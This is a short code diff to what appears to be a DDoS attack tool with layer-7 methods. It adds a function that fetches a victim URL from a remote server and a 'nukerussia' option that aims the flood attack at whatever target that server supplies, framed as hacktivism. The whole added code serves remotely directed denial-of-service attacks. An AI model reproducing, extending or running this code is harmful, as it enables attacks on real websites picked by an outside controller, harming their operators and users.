@@ -1120,6 +1120,13 @@ class ToolsConsole:
             return s.json()
         return {"success": False}
 
+def nukeTarget():
+    with suppress(Exception), get("https://api.itemstolist.top/api/target") as s:
+        target = s.json()['url']
+        logger.info("Target selected to help Ukraine: %s" % target)
+        return target
+    exit("Taget to nuke can't be fetched - please raise with Ukrainian Patriots from Infernum")
+
 
 if __name__ == '__main__':
     with open(__dir__ / "config.json") as f:
@@ -1145,6 +1152,7 @@ if __name__ == '__main__':
 
                 if method in Methods.LAYER7_METHODS:
                     urlraw = argv[2].strip()
+                    if urlraw == 'nukerussia': urlraw = nukeTarget()
                     if not urlraw.startswith("http"):
                         urlraw = "http://" + urlraw
                     url = URL(urlraw)
